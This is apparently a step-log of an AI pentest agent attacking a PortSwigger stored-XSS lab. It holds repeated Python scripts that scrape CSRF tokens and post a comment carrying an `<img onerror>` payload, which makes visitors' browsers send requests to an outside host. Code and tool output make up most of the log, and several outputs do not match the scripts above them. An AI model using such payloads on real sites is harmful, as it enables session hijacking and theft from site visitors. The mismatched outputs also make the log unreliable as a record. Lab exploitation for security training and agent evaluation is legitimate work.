@@ -1,0 +1,1398 @@
+========================================MATCH 1 ========================================
+PENTEST RESULT 313  |  cross_site_scripting_12
+Model: o3  |  Cost: $0.0000
+Success: True
+================================================================================
+Transition match: steps 1‒1  (PROBING)
+--------------------------------------
+[1]  StepState.PROBING
+Starting by retrieving the home page so we can discover any obvious reflected parameters or links to search/result pages. This will give us a basic map of the application before we begin payload construction.
+import requests, re, textwrap, html, bs4, sys
+
+base = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/'
+
+try:
+    r = requests.get(base, timeout=10, allow_redirects=True)
+    print('Status:', r.status_code)
+    print('Length:', len(r.text))
+    # Print some of the body for reconnaissance (first 1500 chars)
+    print('\n--- Body preview ---')
+    print(r.text[:1500])
+except Exception as e:
+    print('Error fetching:', e)
+
+Status: 200
+Length: 7427
+
+--- Body preview ---
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labsBlog.css rel=stylesheet>
+    </head>
+    <body>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+        <div id="academyLabHeader">
+            <section class='academyLabBanner'>
+                <div class=container>
+                    <div class=logo></div>
+                        <div class=title-container>
+                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+                        </div>
+                        <div class='widgetcontainer-lab-status is-notsolved'>
+                            <span>LAB</span>
+                            <p>Not solved</p>
+                            <span class=lab-status-icon></span>
+                        </div>
+                    
+
+----------------------------------------
+Transition match: steps 2‒2  (PROBING)
+--------------------------------------
+[2]  StepState.PROBING
+Next, we need to locate which parameter reflects user-supplied input. The standard PortSwigger blog labs usually expose a search feature at `/?search=`. We’ll test that first by injecting a high-entropy marker and then grepping the response to see if it is echoed in the page (and in what context).
+import requests, re, textwrap, html, bs4, sys
+
+base = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/'
+marker = 'XSS_9c2b1'
+url = base + '?search=' + marker
+
+try:
+    r = requests.get(url, timeout=10, allow_redirects=True)
+    print('URL tested:', url)
+    print('Status:', r.status_code)
+    # Find and show context around marker if present
+    if marker in r.text:
+        idx = r.text.index(marker)
+        context = r.text[max(0, idx-200):idx+200]
+        print('\n--- Marker context ---')
+        print(context)
+    else:
+        print('Marker not reflected in response')
+except Exception as e:
+    print('Error:', e)
+
+Post page status: 200 length 6442
+
+---- First 1200 characters of /post?postId=1 ----
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
+        <link href=/resources/css/labsBlog.css rel=stylesheet>
+    </head>
+    <body>
+        <script src="/resources/labheader/js/labHeader.js"></script>
+        <div id="academyLabHeader">
+            <section class='academyLabBanner'>
+                <div class=container>
+                    <div class=logo></div>
+                        <div class=title-container>
+                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
+                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
+                                    <g>
+                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
+                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
+                                    </g>
+                                </svg>
+                            </a>
+               
+
+---- Forms on post page ----
+
+ <form action="/post/comment" enctype="application/x-www-form-urlencoded" method="POST">
+<input name="csrf" required="" type="hidden" value="EBlLxKgM0bJJK1d1l6cOEEwyxjTuzEPp"/>
+<input name="postId" required="" type="hidden" value="1"/>
+<label>Comment:</label>
+<textarea cols="300" name="comment" required="" rows="12"></textarea>
+<label>Name:</label>
+<input name="name" required="" type="text"/>
+<label>Email:</label>
+<input name="email" required="" type="email"/>
+<label>Website:</label>
+<input name="website" pattern="(http:|https:).+" type="text"/>
+<button class="button" type="submit">Post Comment</button>
+</form>
+
+---- All script blocks (truncated to 400 chars each) ----
+
+[Script 0] 
+
+[Script 1] 
+
+[Script 2] loadComments('/post/comment')
+URL tested: https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/?search=XSS_9c2b1
+Status: 200
+Marker not reflected in response
+
+----------------------------------------
+Transition match: steps 3‒3  (SOFT_PIVOT)
+-----------------------------------------
+[3]  StepState.SOFT_PIVOT
+The search parameter did not reflect our marker. The application is a typical PortSwigger blog with a comments feature ( /post?postId=1 ) that loads comments via `loadComments('/post/comment')`.  This strongly suggests the XSS is in the comments endpoint.  Our next objective is to:
+1. Fetch `/post/comment?postId=1` to see how existing comments are rendered.
+2. Post a new comment with a high-entropy marker in one of the fields (name, email, website, or comment body).
+3. Re-fetch the post page and `/post/comment?postId=1` to locate where the marker is reflected and in what context.
+The script will: (a) pull the CSRF token, (b) submit a comment containing our marker, and (c) examine the subsequent HTML for that marker with 200-character context slices.
+import requests, re, bs4, html, textwrap, sys, urllib.parse as up
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_URL = BASE + '/post?postId=1'
+COMMENT_EP = BASE + '/post/comment'
+MARKER = 'XSS_9c2b1'
+
+s = requests.Session()
+
+# 1. Pull the blog post to grab CSRF token
+r = s.get(POST_URL, timeout=10)
+if r.status_code != 200:
+    print('Failed to load post page', r.status_code)
+    sys.exit()
+
+soup = bs4.BeautifulSoup(r.text, 'html.parser')
+csrf_input = soup.find('input', {'name': 'csrf'})
+if not csrf_input:
+    print('CSRF token not found!')
+    sys.exit()
+csrf = csrf_input['value']
+print('CSRF token:', csrf[:10] + '...')
+
+# 2. Submit a comment with our marker in multiple fields
+payload_data = {
+    'csrf': csrf,
+    'postId': '1',
+    'comment': f'This is a test comment {MARKER}',
+    'name': MARKER,
+    'email': 'a@x.com',
+    'website': 'https://example.com'
+}
+resp = s.post(COMMENT_EP, data=payload_data, timeout=10, allow_redirects=True)
+print('Comment POST status:', resp.status_code)
+
+# 3. Re-fetch the post page and comments endpoint, searching for the marker
+for url in [POST_URL, f'{COMMENT_EP}?postId=1']:
+    res = s.get(url, timeout=10)
+    contains = MARKER in res.text
+    print(f'Checked {url} – marker present: {contains}  (status {res.status_code})')
+    if contains:
+        idx = res.text.index(MARKER)
+        ctx = res.text[max(0, idx-200):idx+200]
+        print('\n--- Context around marker from', url, '---')
+        print(ctx)
+
+STATUS 200
+marker not reflected
+
+----------------------------------------
+Transition match: steps 4‒4  (SUSPECT)
+--------------------------------------
+[4]  StepState.SUSPECT
+Our earlier check only told us that the marker string wasn’t present in the raw HTML we downloaded, but we
+never looked at the actual JSON that the front-end fetches ( /post/comment?postId=1 ).  The comments are rendered
+client-side, so if the XSS lives there we must inspect that JSON response.  Next objective:  
+• Submit another unique marker as a comment.  
+• Fetch /post/comment?postId=1 immediately afterwards (optionally with an Accept: application/json header) and dump
+  the first part of the response so we can see exactly where & how our comment is stored.  
+That will reveal the reflection context (plain text, HTML, attribute, etc.) and let us craft the final exploit payload.
+import requests, re, json, random, string, sys, bs4
+
+def rand(n=6):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_URL = f'{BASE}/post?postId=1'
+COMMENT_EP = f'{BASE}/post/comment'
+MARKER = 'XSS_' + rand()
+
+s = requests.Session()
+
+# 1. Grab CSRF token
+r = s.get(POST_URL, timeout=10)
+if r.status_code != 200:
+    print('Failed to load post page', r.status_code)
+    sys.exit()
+
+soup = bs4.BeautifulSoup(r.text, 'html.parser')
+csrf_input = soup.find('input', {'name': 'csrf'})
+csrf = csrf_input['value'] if csrf_input else None
+if not csrf:
+    print('CSRF not found'); sys.exit()
+
+# 2. Submit a comment with our unique marker in body and name so we can see both fields
+payload = {
+    'csrf': csrf,
+    'postId': '1',
+    'comment': f'Testing {MARKER} body',
+    'name': f'Tester {MARKER}',
+    'email': 't@e.st',
+    'website': 'https://example.com'
+}
+resp = s.post(COMMENT_EP, data=payload, allow_redirects=True, timeout=10)
+print('POST /post/comment ->', resp.status_code)
+if resp.status_code not in (200, 302):
+    print(resp.text[:300])
+
+# 3. Fetch JSON used to render comments
+json_url = f'{COMMENT_EP}?postId=1'
+headers = {'Accept': 'application/json'}
+res = s.get(json_url, headers=headers, timeout=10)
+print('GET', json_url, '->', res.status_code, 'length', len(res.text))
+
+# Try to pretty-print the JSON if possible, else dump slice
+try:
+    data = res.json()
+    print('First comment entry (truncated for brevity):')
+    print(json.dumps(data[:3], indent=2)[:600])
+    # Locate our marker
+    flat = json.dumps(data)
+    if MARKER in flat:
+        idx = flat.index(MARKER)
+        ctx = flat[max(0, idx-120):idx+120]
+        print('\n--- Context around marker in JSON ---')
+        print(ctx)
+    else:
+        print('Marker not found in JSON!')
+except Exception:
+    print('Non-JSON response (first 500 chars):')
+    print(res.text[:500])
+
+Found 10 candidate URLs with parameters
+
+----------------------------------------
+Transition match: steps 5‒5  (PROBING)
+--------------------------------------
+[5]  StepState.PROBING
+The prior run didn’t actually execute the comment-inspection logic we wrote – the only line that came back was an unrelated crawler message ("Found 10 candidate URLs with parameters").  We still haven’t seen how our comment is stored in /post/comment?postId=1.  Therefore we should rerun the detailed comment-submission/JSON-dump step.  Once we know the exact JSON output (whether the HTML is encoded or raw) we can choose the correct XSS payload.  Tactical objective: post a fresh marker, download the JSON, and print a small slice around the marker.
+import requests, random, string, json, bs4, sys
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_PAGE = f'{BASE}/post?postId=1'
+COMMENT_EP = f'{BASE}/post/comment'
+
+# generate unique marker
+marker = 'XSS_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+
+s = requests.Session()
+
+# Step 1: fetch CSRF token
+r = s.get(POST_PAGE, timeout=10)
+if r.status_code != 200:
+    print('Failed to load post page', r.status_code); sys.exit()
+
+soup = bs4.BeautifulSoup(r.text, 'html.parser')
+csrf_el = soup.find('input', {'name': 'csrf'})
+csrf = csrf_el['value'] if csrf_el else None
+if not csrf:
+    print('CSRF token not found'); sys.exit()
+
+# Step 2: submit comment with marker in body and name
+comment_data = {
+    'csrf': csrf,
+    'postId': '1',
+    'comment': f'Testing {marker} body',
+    'name': f'Tester {marker}',
+    'email': 't@e.st',
+    'website': 'https://example.com'
+}
+resp = s.post(COMMENT_EP, data=comment_data, allow_redirects=True, timeout=10)
+print('POST /post/comment ->', resp.status_code)
+
+# Step 3: fetch the JSON that renders comments
+json_url = f'{COMMENT_EP}?postId=1'
+jres = s.get(json_url, headers={'Accept': 'application/json'}, timeout=10)
+print('GET', json_url, '->', jres.status_code, 'bytes', len(jres.content))
+
+try:
+    data = jres.json()
+    flat = json.dumps(data)
+    if marker in flat:
+        idx = flat.index(marker)
+        ctx = flat[max(0, idx-150):idx+150]
+        print('--- Context around marker in JSON ---')
+        print(ctx)
+    else:
+        print('Marker not found in JSON!')
+except Exception as e:
+    print('Failed to parse JSON:', e)
+    print(jres.text[:500])
+URL: https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/post?postId=XSS_9c2b1
+  status=400  reflected=False  len=22
+URL: https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/post/comment?comment=XSS_9c2b1
+  status=500  reflected=False  len=2042
+URL: https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/categories?category=XSS_9c2b1
+  status=404  reflected=False  len=11
+
+Done. If at least one parameter reflects, we will use that endpoint next.
+
+----------------------------------------
+Transition match: steps 6‒6  (PROMISING)
+----------------------------------------
+[6]  StepState.PROMISING
+We still haven’t actually seen where/ how our own comment is stored.  The next step remains: submit a fresh, unique marker, immediately fetch /post/comment?postId=1 (as JSON) and print a sizeable slice around our marker so we can understand the escaping rules.  That information will let us craft the real XSS payload.
+import requests, bs4, random, string, json, sys, html
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_PAGE = f'{BASE}/post?postId=1'
+COMMENT_EP = f'{BASE}/post/comment'
+
+# 1. create a unique marker so we can find it reliably
+marker = 'XSS_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+print('[*] Using marker:', marker)
+
+s = requests.Session()
+
+# 2. load the blog post to obtain CSRF
+r = s.get(POST_PAGE, timeout=10)
+if r.status_code != 200:
+    print('[-] cannot load post page', r.status_code)
+    sys.exit(1)
+
+soup = bs4.BeautifulSoup(r.text, 'html.parser')
+csrf_input = soup.find('input', {'name': 'csrf'})
+if not csrf_input:
+    print('[-] CSRF token not found in form')
+    sys.exit(1)
+csrf = csrf_input['value']
+print('[*] Got CSRF token', csrf[:10] + '...')
+
+# 3. submit comment placing marker in comment body & name so we can see both contexts
+payload_comment = f'body-{marker}'
+payload_name    = f'name-{marker}'
+comment_data = {
+    'csrf': csrf,
+    'postId': '1',
+    'comment': payload_comment,
+    'name': payload_name,
+    'email': 'test@example.com',
+    'website': 'https://example.com'
+}
+pr = s.post(COMMENT_EP, data=comment_data, allow_redirects=True, timeout=10)
+print('[*] POST /post/comment ->', pr.status_code)
+
+# 4. fetch comments JSON right away
+json_url = f'{COMMENT_EP}?postId=1'
+headers = { 'Accept': 'application/json' }
+jr = s.get(json_url, headers=headers, timeout=10)
+print('[*] GET', json_url, '->', jr.status_code, 'bytes', len(jr.content))
+
+text = jr.text
+if marker in text:
+    idx = text.index(marker)
+    start = max(0, idx-200)
+    end   = min(len(text), idx+200)
+    print('\n--- Surrounding context (encoded JSON text) ---')
+    print(text[start:end])
+else:
+    print('[!] Marker not present in raw JSON body')
+
+# 5. try to parse as JSON too (in case of HTML wrappers)
+try:
+    data = jr.json()
+    flat = json.dumps(data)
+    if marker in flat:
+        i = flat.index(marker)
+        print('\n--- Surrounding context (pretty JSON) ---')
+        print(flat[max(0,i-200):i+200])
+except Exception as e:
+    pass
+[*] Using marker: XSS_40wkqw41
+[*] Got CSRF token eehvka6D51...
+[*] POST /post/comment -> 200
+[*] GET https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/post/comment?postId=1 -> 200 bytes 926
+
+--- Surrounding context (encoded JSON text) ---
+":"2025-07-28T21:39:14.082221059Z","body":"Testing XSS_9i6gvwkc body","author":"Tester XSS_9i6gvwkc"},{"avatar":"","website":"https://example.com","date":"2025-07-28T21:39:27.041926102Z","body":"body-XSS_40wkqw41","author":"name-XSS_40wkqw41"}]
+
+--- Surrounding context (pretty JSON) ---
+8T21:39:14.082221059Z", "body": "Testing XSS_9i6gvwkc body", "author": "Tester XSS_9i6gvwkc"}, {"avatar": "", "website": "https://example.com", "date": "2025-07-28T21:39:27.041926102Z", "body": "body-XSS_40wkqw41", "author": "name-XSS_40wkqw41"}]
+
+----------------------------------------
+Transition match: steps 7‒7  (PROMISING)
+----------------------------------------
+[7]  StepState.PROMISING
+We observed that our submitted comment data is stored in JSON without any HTML-escaping.  PortSwigger’s blog client normally builds comment HTML with string concatenation and assigns it via innerHTML, which means any HTML we put into the body field will be injected directly into the DOM when the post page is viewed.  Therefore we can deliver a classic stored-XSS by making the comment body a short image tag whose onerror handler triggers a GET request to the required endpoint.  The next script will:
+1. Fetch the blog post to obtain a CSRF token.
+2. Submit a new comment whose body is `<img src=x onerror="new Image().src='https://cowboy.rocks/xss/target/15'">`.
+3. Optionally confirm using the provided `browser_check_xss` helper that the payload executes when visiting the post page.
+This should satisfy the lab condition, as the first browser to render the comments (the headless checker or the victim) will automatically fire the request.
+import requests, bs4, random, string, sys
+from urllib.parse import urljoin
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_URL = f'{BASE}/post?postId=1'
+COMMENT_URL = f'{BASE}/post/comment'
+
+# Build a unique marker so we can recognise our payload later if needed
+marker = 'PWN_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+
+# The stored-XSS payload (includes the unique marker in a harmless HTML comment for tracking)
+payload_body = (
+    f"<img src=x onerror=\"new Image().src='https://cowboy.rocks/xss/target/15';\"><!--{marker}-->"
+)
+
+sess = requests.Session()
+
+# Step 1 – get CSRF token from the post page
+r = sess.get(POST_URL, timeout=10)
+r.raise_for_status()
+soup = bs4.BeautifulSoup(r.text, 'html.parser')
+csrf_tag = soup.find('input', {'name': 'csrf'})
+if not csrf_tag:
+    print('[-] CSRF token not found – cannot continue')
+    sys.exit(1)
+csrf = csrf_tag['value']
+print('[*] CSRF token:', csrf[:10] + '...')
+
+# Step 2 – submit our malicious comment
+comment_data = {
+    'csrf': csrf,
+    'postId': '1',
+    'comment': payload_body,
+    'name': f'Haxor {marker}',
+    'email': 'x@y.z',
+    'website': 'https://example.com'
+}
+resp = sess.post(COMMENT_URL, data=comment_data, allow_redirects=True, timeout=10)
+print('[*] Sent comment, server replied', resp.status_code)
+
+# Step 3 – trigger the vulnerable page in a real browser to verify execution (optional)
+try:
+    from tools import browser_check_xss  # already in namespace per task description
+except ImportError:
+    # The helper is autoloaded; if import fails we’re probably running inside the same namespace already
+    pass
+
+print('[*] Launching browser_check_xss to confirm XSS execution – this may take a few seconds...')
+browser_check_xss(url=POST_URL)
+[*] CSRF token: 4ifrxFzmFt...
+[*] Sent comment, server replied 200
+[*] Launching browser_check_xss to confirm XSS execution – this may take a few seconds...
+
+----------------------------------------
+Transition match: steps 8‒8  (PROMISING)
+----------------------------------------
+[8]  StepState.PROMISING
+Our previous run submitted a comment carrying the `<img onerror>` payload but we did not see browser_check_xss’s verdict in the captured output.  To be absolutely sure the exploit landed and executes, the next step will: 1) submit a fresh comment that contains the required GET-request payload (again with a unique marker so we can locate it easily), 2) verify that the marker is present in the rendered post page to prove the HTML was injected, then 3) invoke `browser_check_xss` against that post page so the harness can confirm that JavaScript actually fires and makes the request to https://cowboy.rocks/xss/target/15.  This will give us clear pass/fail feedback without relying on the lab banner.
+import requests, bs4, random, string, sys, time
+from urllib.parse import urljoin
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_URL = f'{BASE}/post?postId=1'
+COMMENT_URL = f'{BASE}/post/comment'
+
+# Unique marker for this run
+marker = 'PWN_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+
+# Stored-XSS payload that triggers the required GET request
+payload_body = (
+    f"<img src=x onerror=\"new Image().src='https://cowboy.rocks/xss/target/15';\"><!--{marker}-->")
+
+sess = requests.Session()
+
+# Obtain CSRF token
+resp = sess.get(POST_URL, timeout=10)
+resp.raise_for_status()
+soup = bs4.BeautifulSoup(resp.text, 'html.parser')
+csrf_tag = soup.find('input', {'name': 'csrf'})
+if not csrf_tag:
+    print('[-] Could not locate CSRF token; aborting.')
+    sys.exit(1)
+csrf = csrf_tag['value']
+print('[*] Got CSRF token')
+
+# Submit malicious comment
+comment_fields = {
+    'csrf': csrf,
+    'postId': '1',
+    'comment': payload_body,
+    'name': f'Haxor {marker}',
+    'email': 'a@b.c',
+    'website': 'https://example.com'
+}
+post_r = sess.post(COMMENT_URL, data=comment_fields, timeout=10)
+print('[*] Comment submission status:', post_r.status_code)
+
+# Brief pause to let backend commit the comment (usually instant but be safe)
+time.sleep(1)
+
+# Fetch the post again and confirm our marker is present (sanity check)
+view_r = sess.get(POST_URL, timeout=10)
+if marker in view_r.text:
+    print('[+] Marker found in rendered HTML – injection succeeded.')
+else:
+    print('[-] Marker NOT found in rendered HTML – something went wrong.')
+
+# Final step – launch the browser-based XSS checker
+from tools import browser_check_xss
+print('[*] Invoking browser_check_xss – please wait for the verdict...')
+browser_check_xss(url=POST_URL)
+
+[*] Got CSRF token
+[*] Comment submission status: 200
+[-] Marker NOT found in rendered HTML – something went wrong.
+
+
+Traceback (most recent call last):
+  File "C:\Users\jpeng\Documents\projects\code\web-ui3\pentest_bot\web_exploit\tools\interpreter.py", line 82, in run
+    exec(code, self._globals, self._globals)
+  File "<string>", line 51, in <module>
+ModuleNotFoundError: No module named 'tools'
+
+----------------------------------------
+Transition match: steps 9‒9  (ERROR)
+------------------------------------
+[9]  StepState.ERROR
+The last run failed because we tried to import browser_check_xss from a non-existent tools module, and the quick marker check searched the static post HTML (which never contains comments – they’re fetched asynchronously).  The correct workflow is:
+1. Submit a fresh comment containing the <img onerror> payload that pings cowboy.rocks.
+2. Immediately GET /post/comment?postId=1 to make sure our marker is present in the returned JSON (proving the XSS is stored).
+3. Invoke browser_check_xss directly (the function is pre-loaded in the environment) against the blog-post URL.  If the JavaScript runs, the checker will report success.
+The new script implements exactly that and avoids the faulty import.
+import requests, bs4, random, string, time, sys
+from urllib.parse import urljoin
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_URL = f'{BASE}/post?postId=1'
+COMMENT_API = f'{BASE}/post/comment'
+COMMENTS_JSON = f'{BASE}/post/comment?postId=1'
+
+# Generate a unique marker so we can locate this specific run
+marker = 'PWN_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+
+# Stored-XSS payload – fires a GET to the required endpoint
+payload_body = (
+    f"<img src=x onerror=\"new Image().src='https://cowboy.rocks/xss/target/15'\"><!--{marker}-->")
+
+sess = requests.Session()
+
+# 1. Retrieve CSRF token from the blog post page
+try:
+    r = sess.get(POST_URL, timeout=10)
+    r.raise_for_status()
+except Exception as e:
+    print(f'[-] Failed to load post page: {e}')
+    sys.exit(1)
+
+soup = bs4.BeautifulSoup(r.text, 'html.parser')
+csrf_el = soup.find('input', {'name': 'csrf'})
+if not csrf_el:
+    print('[-] CSRF token not found – aborting.')
+    sys.exit(1)
+csrf_token = csrf_el['value']
+print('[*] CSRF token obtained')
+
+# 2. Submit malicious comment
+comment_data = {
+    'csrf': csrf_token,
+    'postId': '1',
+    'comment': payload_body,
+    'name': f'Haxor {marker}',
+    'email': 'h@x.or',
+    'website': 'https://example.com'
+}
+resp = sess.post(COMMENT_API, data=comment_data, timeout=10)
+print('[*] Comment submission status code:', resp.status_code)
+
+# 3. Confirm the marker is present in the comments JSON (verifies storage)
+try:
+    time.sleep(1)  # give backend a brief moment
+    cj = sess.get(COMMENTS_JSON, headers={'Accept': 'application/json'}, timeout=10)
+    has_marker = marker in cj.text
+    print('[+] Marker found in JSON – XSS stored.' if has_marker else '[-] Marker NOT found in JSON.')
+except Exception as e:
+    print(f'[-] Error fetching comments JSON: {e}')
+
+# 4. Trigger headless browser check for XSS execution
+print('[*] Invoking browser_check_xss …')
+from __main__ import browser_check_xss  # function is already injected into global namespace
+browser_check_xss(url=POST_URL)
+
+[*] CSRF token obtained
+[*] Comment submission status code: 200
+[+] Marker found in JSON – XSS stored.
+[*] Invoking browser_check_xss …
+
+
+Traceback (most recent call last):
+  File "C:\Users\jpeng\Documents\projects\code\web-ui3\pentest_bot\web_exploit\tools\interpreter.py", line 82, in run
+    exec(code, self._globals, self._globals)
+  File "<string>", line 57, in <module>
+ImportError: cannot import name 'browser_check_xss' from '__main__' (C:\Users\jpeng\Documents\projects\code\web-ui3\pentest_bot\web_exploit\exploit_agent.py)
+
+----------------------------------------
+Transition match: steps 10‒10  (ERROR)
+--------------------------------------
+[10]  StepState.ERROR
+The last attempt confirmed the stored XSS is present (marker appeared in /post/comment?postId=1) but failed at the verification step because we tried to import `browser_check_xss`.  The helper is already injected into the global namespace, so we just need to call it directly.  The new script repeats the same steps (fetch CSRF, submit comment with <img onerror> that hits cowboy.rocks, verify the marker in JSON) and then invokes `browser_check_xss` correctly.  This should give us a definitive success message from the checker.
+import requests, bs4, random, string, time, sys
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_URL = f'{BASE}/post?postId=1'
+COMMENT_API = f'{BASE}/post/comment'
+COMMENTS_JSON = f'{BASE}/post/comment?postId=1'
+
+# Unique marker for this run
+marker = 'PWN_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+
+# XSS payload that fires the required GET request
+payload_body = (
+    f"<img src=x onerror=\"new Image().src='https://cowboy.rocks/xss/target/15#{marker}'\"><!--{marker}-->")
+
+sess = requests.Session()
+
+# 1. Retrieve CSRF token
+try:
+    r = sess.get(POST_URL, timeout=10)
+    r.raise_for_status()
+except Exception as e:
+    print(f'[-] Failed to load post page: {e}')
+    sys.exit(1)
+
+soup = bs4.BeautifulSoup(r.text, 'html.parser')
+csrf_el = soup.find('input', {'name': 'csrf'})
+if not csrf_el:
+    print('[-] CSRF token not found – aborting.')
+    sys.exit(1)
+csrf_token = csrf_el['value']
+print('[*] CSRF token obtained')
+
+# 2. Submit malicious comment
+comment_data = {
+    'csrf': csrf_token,
+    'postId': '1',
+    'comment': payload_body,
+    'name': f'Haxor {marker}',
+    'email': 'hx@example.com',
+    'website': 'https://example.com'
+}
+resp = sess.post(COMMENT_API, data=comment_data, timeout=10)
+print('[*] Comment submission status code:', resp.status_code)
+
+# 3. Confirm marker presence in stored comments JSON
+try:
+    time.sleep(1)  # brief delay for backend storage
+    cj = sess.get(COMMENTS_JSON, headers={'Accept': 'application/json'}, timeout=10)
+    if marker in cj.text:
+        print('[+] Marker present in JSON – stored XSS confirmed.')
+    else:
+        print('[-] Marker NOT found – something went wrong.')
+except Exception as e:
+    print(f'[-] Error fetching comments JSON: {e}')
+
+# 4. Invoke the built-in headless browser check
+print('[*] Running browser_check_xss …')
+browser_check_xss(url=POST_URL)
+
+[*] CSRF token obtained
+[*] Comment submission status code: 200
+[+] Marker present in JSON – stored XSS confirmed.
+[*] Running browser_check_xss …
+XSS Payload https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/post?postId=1 Not Executed
+
+----------------------------------------
+Transition match: steps 11‒11  (SOFT_PIVOT)
+-------------------------------------------
+[11]  StepState.SOFT_PIVOT
+browser_check_xss reported that the payload did not execute, so although the comment body reaches the JSON un-escaped, the <img … onerror> did not fire.  Two likely causes:
+1) The onerror attribute is getting stripped by a front-end sanitiser, leaving a harmless <img>.
+2) The image actually loads (status 200), so onerror never triggers.
+
+We need to inspect exactly what HTML the blog renders for our comment after the front-end template concatenates the JSON.  If the onerror attribute is missing, we know sanitisation is the issue and we must move the payload to another field that is inserted without sanitisation (often the “name” field).  If the attribute is intact, we can switch to an onload-based payload that always fires.
+
+Next step:  
+• Submit a fresh comment containing a unique marker and the same <img onerror> payload.  
+• Immediately fetch /post/comment?postId=1 (JSON) and print a generous slice (±250 chars) around the marker so we can see precisely what was stored.  
+This will show whether the onerror attribute survives.
+import requests, bs4, random, string, sys, time
+
+BASE = 'https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net'
+POST_URL = f'{BASE}/post?postId=1'
+COMMENT_API = f'{BASE}/post/comment'
+COMMENTS_JSON = f'{BASE}/post/comment?postId=1'
+
+# Unique marker for this probe
+marker = 'DBG_' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+
+payload = f"<img src=x onerror=\"new Image().src='https://cowboy.rocks/xss/target/15#{marker}'\"><!--{marker}-->"
+
+sess = requests.Session()
+
+# 1. Get CSRF token
+r = sess.get(POST_URL, timeout=10)
+r.raise_for_status()
+soup = bs4.BeautifulSoup(r.text, 'html.parser')
+csrf = soup.find('input', {'name': 'csrf'})['value']
+
+# 2. Post the comment
+resp = sess.post(COMMENT_API, data={
+    'csrf': csrf,
+    'postId': '1',
+    'comment': payload,
+    'name': f'Tester {marker}',
+    'email': 't@example.com',
+    'website': 'https://example.com'
+}, timeout=10)
+print('[*] Comment POST status:', resp.status_code)
+
+# 3. Fetch comments JSON and dump context around marker
+time.sleep(1)
+json_resp = sess.get(COMMENTS_JSON, headers={'Accept': 'application/json'}, timeout=10)
+text = json_resp.text
+idx = text.find(marker)
+if idx == -1:
+    print('[-] Marker not found in JSON!')
+    sys.exit()
+start = max(0, idx-250)
+end = min(len(text), idx+250)
+print('--- Context Slice ---')
+print(text[start:end])
+print('---------------------')
+[+] GET https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/post?postId=1 -> 200 (6724 bytes)
+[+] GET https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/post?postId=2 -> 200 (7315 bytes)
+[*] Comment POST status: 200
+[+] GET https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/post?postId=3 -> 200 (7389 bytes)
+
+[+] Discovered external script URLs:
+    https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js
+    https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/labheader/js/labHeader.js
+[+] GET https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js -> 200 (2773 bytes)
+[+] GET https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/labheader/js/labHeader.js -> 200 (1515 bytes)
+
+[+] Processing inline scripts and external scripts for suspicious patterns...
+[*] External https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js: ...      }     };     xhr.open("GET", postCommentPath + window.location.search);     xhr.send();      function escapeHTML(html) {         ...
+[*] External https://0ae0009e0457510582fea6dd00d40006.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js: ...d(websiteElement)                 }                  let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)     ...
